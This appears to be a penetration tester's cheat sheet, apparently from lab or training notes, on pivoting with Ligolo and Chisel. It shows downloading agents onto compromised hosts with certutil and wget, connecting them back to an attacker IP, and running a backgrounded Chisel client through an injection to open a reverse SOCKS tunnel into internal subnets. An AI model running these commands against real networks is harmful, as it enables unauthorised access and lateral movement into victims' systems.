![[Pasted image 20250725104117.png]]


## LIGOLO

first run
```
sudo ip tuntap add user kali mode tun ligolo
```
then run
```
sudo ip link set ligolo up
```
then we start ligolo using
```
cd /opt/ligolo
```
```
sudo ./proxy -selfcert -laddr 0.0.0.0:8081
```

### Transferring Commands
#### WINDOWS
```
certutil -f -urlcache -split http://<>/agent.exe agent.exe
```
#### LINUX
```
wget http://<>/linux-agent
```

### WINDOWS HOST
then we trf the agent.exe to the  host and ran
```
./agent.exe -connect 192.168.45.172:8081 --ignore-cert
```
### LINUX HOST
```
./linux-agent -connect 192.168.45.172:8081 --ignore-cert
```
THEN RUN
to add the ip routes
```
sudo ip route add 10.10.83.0/24 dev ligolo
```
and run 
```
start
```
on ligolo, tunnel is up and running


can delete ip route using
```
sudo ip route del 10.10.190.0/24 dev ligolo
```





## CHISEL

```
chisel server --port 8080 --reverse
```
We want to connect to the server running on our Kali machine (**192.168.118.4:8080**), creating a reverse SOCKS tunnel (**R:socks**). The **R** prefix specifies a reverse tunnel using a **socks** proxy (which is bound to port **1080** by default). The remaining shell redirections (**> /dev/null 2>&1 &**) force the process to run in the background, so our injection does not hang waiting for the process to finish.

```
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```